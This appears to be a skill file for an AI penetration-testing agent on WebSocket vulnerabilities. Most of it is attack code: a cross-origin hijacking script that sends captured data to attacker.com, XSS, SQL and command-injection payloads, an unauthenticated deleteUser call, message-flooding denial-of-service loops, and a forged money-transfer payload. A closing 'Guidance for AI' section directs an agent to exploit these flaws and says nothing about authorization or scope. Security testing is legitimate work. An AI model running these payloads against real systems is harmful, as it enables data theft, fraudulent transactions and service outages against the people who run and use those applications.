# WebSocket Security Testing Skill

## Goal

Identify and exploit WebSocket vulnerabilities including injection, hijacking, and unauthorized access.

## Methodology

1. **Identify WebSocket Endpoints:** Find ws:// or wss:// connections
2. **Analyze Messages:** Intercept and understand the message format
3. **Test for Injection:** Inject payloads into WebSocket messages
4. **Check Origin Validation:** Test cross-origin WebSocket connections
5. **Test Authentication:** Verify token/session handling

## Finding WebSocket Endpoints

```javascript
// Check browser DevTools Network tab, filter by WS
// Or search for WebSocket connections in JS:
new WebSocket('ws://...')
new WebSocket('wss://...')
```

## Cross-Origin WebSocket Hijacking

```html
<!-- If server doesn't validate Origin -->
<script>
var ws = new WebSocket('wss://vulnerable.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getSecretData"}');
};
ws.onmessage = function(event) {
    fetch('https://attacker.com/log', {
        method: 'POST',
        body: event.data
    });
};
</script>
```

## WebSocket Injection

### XSS via WebSocket
```javascript
// If messages are rendered without sanitization
ws.send('{"message":"<script>alert(document.cookie)</script>"}');
ws.send('{"user":"<img src=x onerror=alert(1)>"}');
```

### SQL Injection via WebSocket
```javascript
ws.send('{"query":"SELECT * FROM users WHERE id=1 OR 1=1--"}');
ws.send('{"search":"admin\' OR \'1\'=\'1"}');
```

### Command Injection via WebSocket
```javascript
ws.send('{"command":"ping 127.0.0.1; id"}');
```

## Authentication Bypass

```javascript
// Test without authentication token
var ws = new WebSocket('wss://target.com/admin/ws');
ws.onopen = function() {
    // Try admin actions without auth
    ws.send('{"action":"deleteUser","id":"123"}');
};

// Test with manipulated token
ws.send('{"token":"manipulated","action":"privilegedAction"}');
```

## Message Tampering

```javascript
// Intercept via Burp Suite or custom proxy
// Example: Change user ID to access others' data
// Original: {"userId": "123", "action": "getData"}
// Modified: {"userId": "456", "action": "getData"}
```

## Denial of Service

```javascript
// Send large messages
var largePayload = 'A'.repeat(10000000);
ws.send(largePayload);

// Rapid message flooding
for(var i=0; i<10000; i++) {
    ws.send('{"ping":"flood"}');
}
```

## CSWSH (Cross-Site WebSocket Hijacking)

```html
<script>
// Similar to CSRF, but for WebSocket
// Works if Origin header isn't validated
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    // Authenticated action using victim's session
    ws.send('{"action":"transferMoney","to":"attacker","amount":1000}');
};
</script>
```

## Tools

* **Burp Suite** - WebSocket message interception
* **wssip** - WebSocket testing tool
* **wscat** - Command-line WebSocket client
* **Browser DevTools** - Monitor WebSocket traffic

## Example Commands

```bash
# Connect with wscat
wscat -c wss://target.com/ws

# With custom headers
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
```

## Guidance for AI

* Activate when testing applications using WebSocket connections
* Check if Origin header is validated on handshake
* Test all message types for injection vulnerabilities
* WebSockets bypass same-origin policy on connection level
* Authentication should be enforced per-message, not just on connect
* Test for IDOR by manipulating user IDs in messages
* Use Burp Suite's WebSocket history for comprehensive testing
